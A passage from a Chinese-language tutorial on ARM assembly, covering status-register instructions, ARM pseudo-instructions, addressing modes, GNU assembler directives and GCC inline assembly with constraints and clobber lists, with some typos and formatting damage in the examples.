SP!,{R0} ;保存SPSR​ TST R0,#T_bit ;测试T标志位​ LDRNEH R0,[LR,#-2] ;若是Thumb指令，读取指令码(16 位)​ BICNE R0,R0,#0xFF00 ;取得Thumb 指令的8 位立即数​ LDREQ R0,[LR,#-4] ;若是ARM 指令，读取指令码(32 位)​ BICNQ R0,R0,#0xFF00000 ;取得ARM 指令的24 位立即数​ …​ LDMFD SP!,{R0-R3,R12,PC}^ ;SWI 异常中断返回 MRS​ 读状态寄存器指令。在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中。指令格式如下：​ MRS{cond} Rd ,psr​ 其中： Rd 目标寄存器。Rd 不允许为R15。​ psr CPSR 或SPSR​ MRS指令举例如下：​ MRS R1,CPSR ;将CPSR状态寄存器读取，保存到R1 中​ MRS R2,SPSR ;将SPSR状态寄存器读取，保存到R2 中​ MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许/禁止IRQ/FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来。​ 使能IRQ 中断例程：​ ENABLE_IRQ​ MRS R0,CPSR​ BIC R0。R0,#0x80​ MSR CPSR_c,R0​ MOV PC,LR​ 禁能IRQ 中断例程：​ DISABLE_IRQ​ MRS R0,CPSR​ ORR R0,R0,#0x80​ MSR CPSR_c,R0​ MOV PC,LR MSR​ 写状态寄存器指令。在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR。指令格式如下：​ MSR{cond} psr_fields,#immed_8r​ MSR{cond} psr_fields,Rm​ 其中： psr CPSR 或SPSR​ fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)：​ c 控制域屏蔽字节(psr[7…0])​ x 扩展域屏蔽字节(psr[15…8])​ s 状态域屏蔽字节(psr[23。…16])​ f 标志域屏蔽字节(psr[31…24])​ immed_8r 要传送到状态寄存器指定域的立即数，8 位。​ Rm 要传送到状态寄存器指定域的数据的源寄存器。​ MSR 指令举例如下：​ MSR CPSR_c,#0xD3 ;CPSR[7…0]=0xD3，即切换到管理模式。​ MSR CPSR_cxsf,R3 ;CPSR=R3​ 只有在特权模式下才能修改状态寄存器。​ 程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态/Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许/禁止IRQ/FIQ 中断等设置。​ 堆栈指令实始化例程：​ INITSTACK​ MOV R0,LR ;保存返回地址​ ;设置管理模式堆栈​ MSR CPSR_c,#0xD3​ LDR SP,StackSvc​ ;设置中断模式堆栈​ MSR CPSR_c,#0xD2​ LDR SP,StackIrq​ … 1.3.6. ARM 伪指令​ ARM 伪指令不是ARM 指令集中的指令，只是为了编程方便编译器定义了伪指令，使用时可以像其它ARM 指令一样使用，但在编译时这些指令将被等效的ARM 指令代替。ARM伪指令有四条，分别为ADR 伪指令、ADRL 伪指令、LDR 伪指令和NOP 伪指令。 ADR​ 小范围的地址读取伪指令。ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败。​ ADR 伪指令格式如下：​ ADR{cond} register,exper​ 其中：register 加载的目标寄存器。​ exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。​ 对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。​ ADR 伪指令举例如下：​ LOOP MOV R1, #0xF0​ …​ ADR R2, LOOP ;将LOOP 的地址放入R2​ ADR R3, LOOP+4​ 可以用ADR 加载地址，实现查表：​ …​ ADR R0,DISP_TAB ;加载转换表地址​ LDRB R1,[R0,R2] ;使用R2作为参数，进行查表​ …​ DISP_TAB​ DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90 ADRL​ 中等范围的地址读取伪指令。ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败。ADRL伪指令格式如下：​ ADR{cond} register,exper​ 其中：register 加载的目标寄存器。​ expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。​ ADRL 伪指令举例如下：​ ADRL R0,DATA_BUF​ …​ ADRL R1 DATA_BUF+80​ …​ DATA_BUF​ SPACE 100 ;定义100 字节缓冲区​ 可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：​ …​ ADR LR,RETURNI ;设置返回地址​ ADRL R1Thumb_Sub+1 ;取得了Thumb 子程序入口地址，且R1 的0 位置1​ BX R1 ;调用Thumb子程序，并切换处理器状态​ RETURNI​ …​ CODE16​ Thumb_Sub​ MOV R1,#10​ … LDR​ 大范围的地址读取伪指令。LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量。LDR 伪指令格式如下：​ LDR{cond} register,=expr/label_expr​ 其中：register 加载的目标寄存器​ expr 32 位立即数。​ label_expr 基于PC 的地址表达式或外部表达式。​ LADR 伪指令举例如下：。​ LDR R0,=0x123456 ;加载32 位立即数0x12345678​ LDR R0,=DATA_BUF+60 ;加载DATA_BUF 地址+60​ …​ LTORG ;声明文字池​ 伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数：​ …​ LDR R0,=IOPIN ;加载GPIO 寄存器IOPIN 的地址​ LDR R1,[R0] ;读取IOPIN 寄存器的值​ …​ LDR R0,=IOSET​ LDR R1,=0x00500500​ STR R1,[R0] ;IOSET=0x00500500​ …​ 从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“=”号 NOP​ 空操作伪指令。NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等，NOP 伪指令格式如下：​ NOP​ NOP​ NOP​ NOP​ SUBS R1, R1, #1​ BNE DELAY1​ … 1.4. 寻址方式1.4.1. 立即数寻址立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%”。 1.4.2. 寄存器寻址1.4.3. 寄存器间接寻址以寄存器中的值作为操作数的地址，而操作数本身放在存储器中。 例如： 1ADD R0，R1，[R2] 1.4.4. 基址变址寻址将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址。 例如：LDR R0，[R1，#4] R0&lt;-[R1+4] 1.4.5. 多寄存器寻址一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值。 LDMIA R0，{R1，R2，R3，R4} 1.4.6. 相对寻址以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址。 例如：BL NEXT; 1.4.7. 堆栈寻址使用一个堆栈指针的专用寄存器指示当前操作位置 递增堆栈：向高地址方向生长 递减堆栈：向低地址方向生长 满堆栈：堆栈指针指向最后压入堆栈的有效数据 空堆栈：堆栈指针指向下一个要放入数据的空位置 2. GNU ARM混编​ 汇编源程序一般用于系统最基本的初始化：初始化堆栈指针、设置页表、操作 ARM的协处理器等。这些初始化工作完成后就可以跳转到C代码main函数中执行。 1.1. GNU汇编语言语句格式​ 任何Linux汇编行都是如下结构：[:][} @comment l instruction为指令 l directive为伪操作 l pseudo-instruction为伪指令 l :为标号, GNU汇编中，任何以冒号结尾的标识符都被认为是一个标号，而不一定非要在一行的开始。 l comment为语句的注释 下面定义一个”add”的函数，最终返回两个参数的和： .section.text, “x” .globaladd @ give the symbol “add” externallinkage add: ​ ADD r0, r0, r1 @ add input arguments ​ MOV pc, lr @ return from subroutine @ endof program 注意： l ARM指令，伪指令，伪操作，寄存器名可以全部为大写字母，也可全部为小写字母，但不可大小写混用。 l 如果语句太长，可以将一条语句分几行来书写，在行末用“\”表示换行（即下一行与本行为同一语句）。“\”后不能有任何字符，包含空格和制表符（Tab)。 1.2. GNU汇编程序中的标号symbol（或label）​ 标号只能由a～z，A～Z，0～9，“.”，_等（由点、字母、数字、下划线等组成，除局部标号外，不能以数字开头）字符组成。 Symbol的本质：代表它所在的地址,因此也可以当作变量或者函数来使用。 l 段内标号的地址值在汇编时确定； l 段外标号的地址值在连接时确定。 Symbol的分类：3类（依据标号的生成方式）。 基于PC的标号。基于PC的标号是位于目标指令前的标号或者程序中数据定义伪操作前的标号。这种标号在汇编时将被处理成PC值加上（或减去）一个数字常量，常用于表示跳转指令”b”等的目标地址，或者代码段中所嵌入的少量数据。 基于寄存器的标号。基于寄存器的标号常用MAP和FIELD来定义，也可以用EQU来定义。这种标号在汇编时将被处理成寄存器的值加上（或减去）一个数字常量，常用于访问数据段中的数据。 绝对地址。绝对地址是一个32位数据。它可以寻址的范围为[0，232-1]即可以直接寻址整个内存空间。 特别说明：局部标号Symbol ​ 局部标号主要在局部范围内使用，而且局部标号可以重复出现。它由两部组成：开头是一个0-99直接的数字，后面紧接一个通常表示该局部变量作用范围的符号。局部变量的作用范围通常为当前段，也可以用ROUT来定义局部变量的作用范围。 ​ 局部变量定义的语法格式：N{routname} l N：为0~99之间的数字。 l routname：当前局部范围的名称（为符号），通常为该变量作用范围的名称（用ROUT伪操作定义的）。 ​ 局部变量引用的语法格式：%{F|B}{A|T}N{routname} l %：表示引用操作 l N：为局部变量的数字号 l routname：为当前作用范围的名称（用ROUT伪操作定义的） l F：指示编译器只向前搜索 l B：指示编译器只向后搜索 l A：指示编译器搜索宏的所有嵌套层次 l T：指示编译器搜索宏的当前层次 例：使用局部符号的例子，一段循环程序 subs r0, r0, #1 @每次循环使r0=r0-1 bne 1F @跳转到1标号去执行 注意： l 如果F和B都没有指定，编译器先向前搜索，再向后搜索 l 如果A和T都没有指定，编译器搜索所有从当前层次到宏的最高层次，比当前层次低的层次不再搜索。 l 如果指定了routname，编译器向前搜索最近的ROUT伪操作，若routname与该ROUT伪操作定义的名称不匹配，编译器报告错误，汇编失败。 1.3. GNU汇编程序中的分段 .section伪操作 .section &lt;section_name&gt; {,””} Startsa new code or data section. Sections in GNU are called .text, a code section, .data, an initializeddata section, and .bss, an uninitialized data section. Thesesections have default flags, and the linker understands the default names(similardirective to the armasm directive AREA).The following are allowable .section flags for ELF format files: Meaning a allowable section w writable section x executable section 中文解释： 用户可以通过.section伪操作来自定义一个段,格式如下： .section section_name [,”flags”[, %type[,flag_specific_arguments]]] 每一个段以段名为开始, 以下一个段名或者文件结尾为结束。这些段都有缺省的标志（flags），连接器可以识别这些标志。(与arm asm中的AREA相同)。下面是ELF格式允许的段标志flags： &lt;标志&gt; 含义 a 允许段 w 可写段 x 执行段 例：定义一个“段” .section.mysection @自定义数据段，段名为 “.mysection” .align 2 strtemp: ​ .ascii “Temp string \n\0” @对这一句的理解，我觉得应该是：将”Temp string \n\0”这个字符串存储在以标号strtemp为起始地址的一段内存空间里 汇编系统预定义的段名 l .text @代码段 l .data @初始化数据段.data Read-write initialized long data. l .bss @未初始化数据段 l .sdata @ .sdata Read-write initialized short data. l .sbss @ 注意：源程序中.bss段应该在.text段之前。 1.4. GNU汇编语言定义入口点汇编程序的缺省入口是_start标号，用户也可以在连接脚本文件中用ENTRY标志指明其它入口点。 例：定义入口点 .section .data &lt; initialized data here&gt; .section .bss &lt; uninitialized data here&gt; .section .text .globl _start _start: 1.5. GNU汇编程序中的宏定义格式如下： .macro 宏名参数名列表 @伪指令.macro定义一个宏 宏体 .endm @.endm表示宏结束 ​ 如果宏使用参数,那么在宏体中使用该参数时添加前缀“\”。宏定义时的参数还可以使用默认值。可以使用.exitm伪指令来退出宏。 例：宏定义 .macroSHIFTLEFT a, b .if \b&lt; 0 MOV \a,\a, ASR #-\b .exitm .endif MOV \a,\a, LSL #\b .endm 1.6. GNU汇编程序中的常数 十进制数以非0数字开头,如:123和9876； 二进制数以0b开头,其中字母也可以为大写； 八进制数以0开始,如:0456,0123； 十六进制数以0x开头,如:0xabcd,0X123f； 字符串常量需要用引号括起来,中间也可以使用转义字符,如: “You are welcome!\n”； 当前地址以“.”表示,在GNU汇编程序中可以使用这个符号代表当前指令的地址； 表达式：在汇编程序中的表达式可以使用常数或者数值, “-”表示取负数, “~”表示取补,“&lt;&gt;”表示不相等,其他的符号如:+、-、*、/、%、&lt;、&lt;&lt;、&gt;、&gt;&gt;、|、&amp;、^、!、==、&gt;=、&lt;=、&amp;&amp;、|| 跟C语言中的用法相似。 1.7. GNU ARM汇编的常用伪操作​ 在前面已经提到过了一些为操作，还有下面一些为操作： l 数据定义伪操作： .byte，.short，.long，.quad，.float，.string/.asciz/.ascii，重复定义伪操作.rept，赋值语句.equ/.set ； l 函数的定义； l 对齐方式伪操作 .align； l 源文件结束伪操作.end； l .include伪操作； l if伪操作； l .global/ .globl 伪操作； l .type伪操作； l 列表控制语句； 别于GNU AS汇编的通用伪操作,下面是ARM特有的伪操作： .reg ，.unreq ，.code ，.thumb ，.thumb_func ，.thumb_set， .ltorg ，.pool 数据定义伪操作 l .byte:单字节定义，如：.byte 1,2,0b01,0x34,072,’s’ ； l .short:定义双字节数据，如:.short 0x1234,60000 ； l .long:定义4字节数据，如:.long 0x12345678,23876565 l .quad:定义8字节，如:.quad 0x1234567890abcd l .float：定义浮点数，如：.float 0f-314159265358979323846264338327\ ​ 95028841971.693993751E-40 @ - pi l .string/.asciz/.ascii：定义多个字符串，如: .string “abcd”,”efgh”, “hello!” .asciz “qwer”,”sun”, “world!” .ascii “welcome\0” ​ 注意：ascii伪操作定义的字符串需要自行添加结尾字符’\0’。 l .rept:重复定义伪操作, 格式如下： .rept 重复次数 数据定义 .endr @结束重复定义 例： .rept 3 .byte 0x23 .endr l .equ/.set: 赋值语句, 格式如下： .equ(.set)变量名，表达式 例： .equ abc, 3 @让abc=3 函数的定义伪操作 l 函数的定义,格式如下： 函数名: 函数体 返回语句 ​ 一般的,函数如果需要在其他文件中调用, 需要用到.global伪操作将函数声明为全局函数。为了不至于在其他程序在调用某个C函数时发生混乱,对寄存器的使用我们需要遵循APCS准则。函数编译器将处理函数代码为一段.global的汇编码。 l 函数的编写应当遵循如下规则： a. a1-a4寄存器（参数、结果或暂存寄存器，r0到r3 的同义字）以及浮点寄存器f0-f3(如果存在浮点协处理器)在函数中是不必保存的； b. 如果函数返回一个不大于一个字大小的值，则在函数结束时应该把这个值送到 r0 中； c. 如果函数返回一个浮点数，则在函数结束时把它放入浮点寄存器f0中； d. 如果函数的过程改动了sp（堆栈指针，r13）、fp（框架指针，r11）、sl（堆栈限制，r10）、lr（连接寄存器，r14）、v1-v8（变量寄存器，r4 到 r11）和 f4-f7,那么函数结束时这些寄存器应当被恢复为包含在进入函数时它所持有的值。 .align .end .include .incbin伪操作 l .align:用来指定数据的对齐方式,格式如下: ​ .align [absexpr1, absexpr2] ​ 以某种对齐方式,在未使用的存储区域填充值. 第一个值表示对齐方式,4, 8,16或 32.第二个表达式值表示填充的值。 l .end:表明源文件的结束。 l .include:可以将指定的文件在使用.include 的地方展开,一般是头文件,例如: ​ .include “myarmasm.h” l .incbin伪操作可以将原封不动的一个二进制文件编译到当前文件中,使用方法如下: ​ .incbin”file”[,skip[,count]] ​ skip表明是从文件开始跳过skip个字节开始读取文件,count是读取的字数. ..if伪操作 ​ 根据一个表达式的值来决定是否要编译下面的代码, 用.endif伪操作来表示条件判断的结束,中间可以使用.else来决定.if的条件不满足的情况下应该编译哪一部分代码。 .if有多个变种: .ifdefsymbol @判断symbol是否定义 .ifcstring1,string2 @字符串string1和string2是否相等,字符串可以用单引号括起来 .ifeqexpression @判断expression的值是否为0 .ifeqsstring1,string2 @判断string1和string2是否相等,字符串必须用双引号括起来 .ifgeexpression @判断expression的值是否大于等于0 .ifgtabsolute expression @判断expression的值是否大于0 .ifleexpression @判断expression的值是否小于等于0 .ifltabsolute expression @判断expression的值是否小于0 .ifncstring1,string2 @判断string1和string2是否不相等, 其用法跟.ifc恰好相反。 .ifndefsymbol, .ifnotdef symbol @判断是否没有定义symbol, 跟.ifdef恰好相反 .ifneexpression @如果expression的值不是0, 那么编译器将编译下面的代码 .ifnesstring1,string2 @如果字符串string1和string2不相等, 那么编译器将编译下面的代码. .global .type .title .list l .global/ .globl ：用来定义一个全局的符号，格式如下: ​ .global symbol 或者 .globl symbol l .type：用来指定一个符号的类型是函数类型或者是对象类型, 对象类型一般是数据, 格式如下: ​ .type 符号, 类型描述 例： .globla .data .align4 .typea, @object .sizea, 4 a: .long10 例： .section.text .typeasmfunc, @function .globlasmfunc asmfunc: mov pc,lr 列表控制语句: .title：用来指定汇编列表的标题,例如: .title “my program” .list：用来输出列表文件. ARM特有的伪操作 l .reg: 用来给寄存器赋予别名,格式如下: ​ 别名 .req 寄存器名 l .unreq: 用来取消一个寄存器的别名,格式如下: .unreq 寄存器别名 ​ 注意被取消的别名必须事先定义过,否则编译器就会报错,这个伪操作也可以用来取消系统预制的别名, 例如r0, 但如果没有必要的话不推荐那样做。 l .code伪操作用来选择ARM或者Thumb指令集,格式如下: .code 表达式 如果表达式的值为16则表明下面的指令为Thumb指令,如果表达式的值为32则表明下面的指令为ARM指令. l .thumb伪操作等同于.code 16, 表明使用Thumb指令, 类似的.arm等同于.code 32 l .force_thumb伪操作用来强制目标处理器选择thumb的指令集而不管处理器是否支持 l .thumb_func伪操作用来指明一个函数是thumb指令集的函数 l .thumb_set伪操作的作用类似于.set, 可以用来给一个标志起一个别名, 比.set功能增加的一点是可以把一个标志标记为thumb函数的入口, 这点功能等同于.thumb_func l .ltorg用于声明一个数据缓冲池(literal pool)的开始,它可以分配很大的空间。 l .pool的作用等同.ltorg l .space&lt;number_of_bytes&gt; {,&lt;fill_byte&gt;} ​ 分配number_of_bytes字节的数据空间，并填充其值为fill_byte，若未指定该值，缺省填充0。（与armasm中的SPACE功能相同） l .word {,} …插入一个32-bit的数据队列。（与armasm中的DCD功能相同）可以使用.word把标识符作为常量使用。 例： Start: valueOfStart: ​ .word Start 这样程序的开头Start便被存入了内存变量valueOfStart中。 l .hword {,} … 插入一个16-bit的数据队列。（与armasm中的DCW相同） 1.8. GNU ARM汇编特殊字符和语法 代码行中的注释符号: ‘@’ 整行注释符号: ‘#’ 语句分离符号: ‘;’ 立即数前缀: ‘#’ 或 ‘$’ 3. ARM GCC 内嵌汇编对于基于ARM的RISC处理器，GNUC编译器提供了在C代码中内嵌汇编的功能。这种非常酷的特性提供了C代码没有的功能，比如手动优化软件关键部分的代码、使用相关的处理器指令。这里设想了读者是熟练编写ARM汇编程序读者，因为该片文档不是ARM汇编手册。同样也不是C语言手册。这篇文档假设使用的是GCC 4 的版本，但是对于早期的版本也有效。 GCCasm 声明 让我们以一个简单的例子开始。就像C中的声明一样，下面的声明代码可能出现在你的代码中。 /NOP 例子 / asm(“movr0,r0”); 该语句的作用是将r0移动到r0中。换句话讲他并不干任何事。典型的就是NOP指令，作用就是短时的延时。 请接着阅读和学习这篇文档，因为该声明并不像你想象的和其他的C语句一样。内嵌汇编使用汇编指令就像在纯汇编程序中使用的方法一样。可以在一个asm声明中写多个汇编指令。但是为了增加程序的可读性，最好将每一个汇编指令单独放一行。 asm( “mov r0, r0\n\t” “mov r0, r0\n\t” “mov r0, r0\n\t” “mov r0, r0” ); 换行符和制表符的使用可以使得指令列表看起来变得美观。你第一次看起来可能有点怪异，但是当C编译器编译C语句的是候，它就是按照上面（换行和制表）生成汇编的。到目前为止，汇编指令和你写的纯汇编程序中的代码没什么区别。但是对比其它的C声明，asm的常量和寄存器的处理是不一样的。通用的内嵌汇编模版是这样的。 asm(code : output operand list : input operand list : clobberlist); 汇编和C语句这间的联系是通过上面asm声明中可选的outputoperand list和input operand list。Clobber list后面再讲。 下面是将c语言的一个整型变量传递给汇编，逻辑左移一位后在传递给C语言的另外一个整型变量。 / Rotating bits example / asm(“mov %[result], %[value], ror #1” :[result] “=r” (y) : [value] “r” (x)); 每一个asm语句被冒号（:）分成了四个部分。 汇编指令放在第一部分中的“”中间。 “mov %[result], %[value], ror #1” 接下来是冒号后的可选择的output operand list，每一个条目是由一对[]（方括号）和被他包括的符号名组成，它后面跟着限制性字符串，再后面是圆括号和它括着的C变量。这个例子中只有一个条目。 [result] “=r” (y) 接着冒号后面是输入操作符列表，它的语法和输入操作列表一样 [value] “r” (x) 破坏符列表，在本例中没有使用 就像上面的NOP例子，asm声明的4个部分中，只要最尾部没有使用的部分都可以省略。但是有有一点要注意的是，上面的4个部分中只要后面的还要使用，前面的部分没有使用也不能省略，必须空但是保留冒号。下面的一个例子就是设置ARMSoc的CPSR寄存器，它有input但是没有output operand。 asm(“msr cpsr,%[ps]” : : [ps]”r”(status)) 即使汇编代码没有使用，代码部分也要保留空字符串。下面的例子使用了一个特别的破坏符，目的就是告诉编译器内存被修改过了。这里的破坏符在下面的优化部分在讲解。 asm(“”:::”memory”); 为了增加代码的可读性，你可以使用换行，空格，还有C风格的注释。 asm(“mov %[result], %[value], ror#1” ​ : [result]”=r” (y) /Rotation result. / ​ : [value]”r” (x) /Rotated value. / ​ : / No clobbers / ); 在代码部分%后面跟着的是后面两个部分方括号中的符号，它指的是相同符号操作列表中的一个条目。 %[result]表示第二部分的C变量y，%[value]表示三部分的C变量x； 符号操作符的名字使用了独立的命名空间。这就意味着它使用的是其他的符号表。简单一点就是说你不必关心使用的符号名在C代码中已经使用了。在早期的C代码中，循环移位的例子必须要这么写： asm(“mov %0, %1, ror #1” :”=r” (result) : “r” (value)) 在汇编代码中操作数的引用使用的是%后面跟一个数字，%1代表第一个操作数，%2代码第二个操作数，往后的类推。这个方法目前最新的编译器还是支持的。但是它不便于维护代码。试想一下，你写了大量的汇编指令的代码，要是你想插入一个操作数，那么你就不得不从新修改操作数编号。 优化C代码 有两种情况决定了你必须使用汇编。1st，C限制了你更加贴近底层操作硬件，比如，C中没有直接修改程序状态寄存器（PSR）的声明。2nd就是要写出更加优化的代码。毫无疑问GNUC代码优化器做的很好，但是他的结果和我们手工写的汇编代码相差很远。 这一部分有一点很重要，也是被别人忽视最多的就是：我们在C代码中通过内嵌汇编指令添加的汇编代码，也是要被C编译器的优化器处理的。让我们下面做个试验来看看吧。 下面是代码实例。 bigtree@just:~/embedded/basic-C$ arm-linux-gcc -c test.c bigtree@just:~/embedded/basic-C$ arm-linux-objdump -D test.o 编译器选择r3作为循环移位使用。它也完全可以选择为每一个C变量分配寄存器。Load或者store一个值并不显式的进行。下面是其它编译器的编译结果。 E420A0E1 mov r2, r4, ror #1 @ y, x 编译器为每一个操作数选择一个相应的寄存器，将操作过的值cache到r4中，然后传递该值到r2中。这个过程你能理解不？ 有的时候这个过程变得更加糟糕。有时候编译器甚至完全抛弃你嵌入的汇编代码。C编译器的这种行为，取决于代码优化器的策略和嵌入汇编所处的上下文。如果在内嵌汇编语句中不使用任何输出部分，那么C代码优化器很有可能将该内嵌语句完全删除。比如NOP例子，我们可以使用它作为延时操作，但是对于编译器认为这影响了程序的执行速速，认为它是没有任何意义的。 上面的解决方法还是有的。那就是使用volatile关键字。它的作用就是禁止优化器优化。将NOP例子修改过后如下： / NOP example, revised / asm volatile(“movr0, r0”); 下面还有更多的烦恼等着我们。一个设计精细的优化器可能重新排列代码。看下面的代码： i++; if (j == 1) x += 3; i++; 优化器肯定是要从新组织代码的，两个i++并没有对if的条件产生影响。更进一步的来讲，i的值增加2，仅仅使用一条ARM汇编指令。因而代码要重新组织如下： if (j == 1) x += 3; i += 2; 这样节省了一条ARM指令。结果是：这些操作并没有得到许可。 这些将对你的代码产生很到的影响，这将在下面介绍。下面的代码是c乘b，其中c和b中的一个或者两个可能会被中断处理程序修改。进入该代码前先禁止中断，执行完该代码后再开启中断。 asm volatile(“mrs r12,cpsr\n\t” “orr r12, r12, #0xC0\n\t” “msr cpsr_c, r12\n\t” ::: “r12”, “cc”); c = b; / This may fail. */ asm volatile(“mrs r12, cpsr\n” “bic r12, r12, #0xC0\n” “msr cpsr_c, r12” ::: “r12”, “cc”); 但是不幸的是针对上面的代码，优化器决定先执行乘法然后执行两个内嵌汇编，或相反。这样将会使得我们的代码变得毫无意义。 我们可以使用clobberlist帮忙。上面例子中的clobber list如下： “r12”,”cc” 上面的clobber list将会将向编译器传达如下信息，修改了r12和程序状态寄存器的标志位。Btw，直接指明使用的寄存器，将有可能阻止了最好的优化结果。通常你只要传递一个变量，然后让编译器自己选择适合的寄存器。另外寄存器名，cc（condition registor 状态寄存器标志位），memory都是在clobber list上有效的关键字。它用来向编译器指明，内嵌汇编指令改变了内存中的值。这将强迫编译器在执行汇编代码前存储所有缓存的值，然后在执行完汇编代码后重新加载该值。这将保留程序的执行顺序，因为在使用了带有memory clobber的asm声明后，所有变量的内容都是不可预测的。 asm volatile(“mrs r12,cpsr\n\t” “orr r12, r12, #0xC0\n\t” “msr cpsr_c, r12\n\t” :: : “r12”, “cc”,”memory”); c = b; / This is safe. */ asm volatile(“mrs r12, cpsr\n” “bic r12, r12, #0xC0\n” “msr cpsr_c, r12” ::: “r12”, “cc”,”memory”); 使所有的缓存的值都无效，只是局部最优（suboptimal）。你可以有选择性的添加dummyoperand 来人工添加依赖。 asm volatile(“mrs r12,cpsr\n\t” “orr r12, r12, #0xC0\n\t” “msr cpsr_c, r12\n\t” : “=X” (b) :: “r12”,”cc”); c = b; / This is safe. */ asm volatile(“mrs r12 上面的第一个asm试图修改变量先b，第二个asm试图修改c。这将保留三个语句的执行顺序，而不要使缓存的变量无效。 理解优化器对内嵌汇编的影响很重要。如果你读到这里还是云里雾里，最好是在看下个主题之前再把这段文章读几遍^_^。 Input and output operands 前面我们学到，每一个input和output operand，由被方括号[]中的符号名，限制字符串，圆括号中的C表达式构成。 这些限制性字符串有哪些，为什么我们需要他们？你应该知道每一条汇编指令只接受特定类型的操作数。例如：跳转指令期望的跳转目标地址。不是所有的内存地址都是有效的。因为最后的opcode只接受24位偏移。但矛盾的是跳转指令和数据交换指令都希望寄存器中存储的是32位的目标地址。在所有的例子中，C传给operand的可能是函数指针。所以面对传给内嵌汇编的常量、指针、变量，编译器必须要知道怎样组织到汇编代码中。 对于ARM核的处理器，GCC 4 提供了一下的限制。 Constraint Usage in ARM state Usage in Thumb state f Floating point registers f0 .. f7 Not available G Immediate floating point constant Not available H Same a G, but negated Not available I Immediate value in data processing instructionse.g. ORR R0, R0, #operand Constant in the range 0 .. 255e.g. SWI operand J Indexing constants -4095 .. 4095e.g. LDR R1, [PC, #operand] Constant in the range -255 .. -1e.g. SUB R0, R0, #operand K Same as I, but inverted Same as I, but shifted L Same as I, but negated Constant in the range -7 .. 7e.g. SUB R0, R1, #operand l Same as r Registers r0..r7e.g. PUSH operand M Constant in the range of 0 .. 32 or a power of 2e.g. MOV R2, R1, ROR #operand Constant that is a multiple of 4 in the range of 0 .. 1020e.g. ADD R0, SP, #operand m Any valid memory address N Not available Constant in the range of 0 .. 31e.g. LSL R0, R1, #operand o Not available Constant that is a multiple of 4 in the range of -508 .. 508e.g. ADD SP, #operand r General register r0 .. r15e.g. SUB operand1, operand2, operand3 Not available W Vector floating point registers s0 .. s31 Not available X Any operand = ：Write-only operand, usually used for all output operands+ ：Read-write operand, must be listed as an output operand&amp; ：A register that should be used for output only Output operands必须为write-only，相应C表达式的值必须是左值。Input operands必须为read-only。C编译器是没有能力做这个检查。 比较严格的规则是：不要试图向input operand写。但是如果你想要使用相同的operand作为input和output。限制性modifier（+）可以达到效果。例子如下： asm(“mov %[value], %[value], ror #1” : [value]”+r” (y)) 和上面例子不一样的是，最后的结果存储在input variable中。 可能modifier + 不支持早期的编译器版本。庆幸的是这里提供了其他解决办法，该方法在最新的编译器中依然有效。对于input operators有可能使用单一的数字n在限制字符串中。使用数字n可以告诉编译器使用的第n个operand，operand都是以0开始计数。下面是例子： asm(“mov %0, %0, ror #1” : “=r” (value) :”0” (value)) 限制性字符串“0”告诉编译器，使用和第一个output operand使用同样input register。 请注意，在相反的情况下不会自动实现。如果我没告诉编译器那样做，编译器也有可能为input和output选择相同的寄存器。第一个例子中就为input和output选择了r3。 在多数情况下这没有什么，但是如果在input使用前output已经被修改过了，这将是致命的。在input和output使用不同寄存器的情况下，你必须使用&amp;modifier来限制outputoperand。下面是代码示例： asm volatile(“ldr %0, [%1]””\n\t” ​ “str %2, [%1, #4]””\n\t” ​ : “=&amp;r” (rdv) ​ : “r”(&amp;table), “r” (wdv) ​ : “memory”); 在以张表中读取一个值然后在写到该表的另一个位置。 其他 内嵌汇编作为预处理宏 要是经常使用使用部分汇编，最好的方法是将它以宏的形式定义在头文件中。使用该头文件在严格的ANSI模式下会出现警告。为了避免该类问题，可以使用asm代替asm，volatile代替volatile。这可以等同于别名。下面就是个例程： #define BYTESWAP(val) \ asm volatile ( \ ​ “eor r3, %1, %1, ror #16\n\t” \ ​ “bic r3, r3, #0x00FF0000\n\t” \ ​ “mov %0, %1, ror #8\n\t” \ ​ “eor %0, %0, r3, lsr #8” \ ​ : “=r” (val) \ ​ : 